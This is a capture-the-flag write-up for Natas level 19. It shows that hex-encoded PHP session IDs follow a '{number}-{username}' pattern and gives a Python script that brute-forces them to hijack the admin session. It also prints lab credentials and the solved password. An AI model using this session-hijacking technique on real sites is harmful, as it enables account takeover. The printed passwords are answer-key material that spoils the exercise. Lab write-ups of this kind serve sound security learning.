# Writeup level 19
The page says:  
> This page uses mostly the same code as the previous level, but session IDs are no longer sequential...  

Checking out the session we can see that the value of PHPSESSID is in hex. When we unhex that value we can see that the session id is built like the following:  
{1..640}-{username}  

So our bruteforce will change to be the following:  

- built a new String like: {i}-admin
- i starts at 1 and ends at 640

**Exploit**  
```python
import requests

url = "http://natas19.natas.labs.overthewire.org/index.php?debug=true"
data={"username": "admin", "password": "1234"}

for i in range(1,641):
	payload = f"{i}-admin".encode('utf-8')
	payload_hex = payload.hex()

	cookies = {'PHPSESSID': payload_hex}
	r = requests.post(url, cookies=cookies,data=data, auth=("natas19", "4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs"))

	if("You are an admin." in r.text):
		print(r.text)
		break
	else:
		print(i)

```
 

The password is:  
eofm3Wsshxc5bwtVnEuGIlr7ivb9KABF



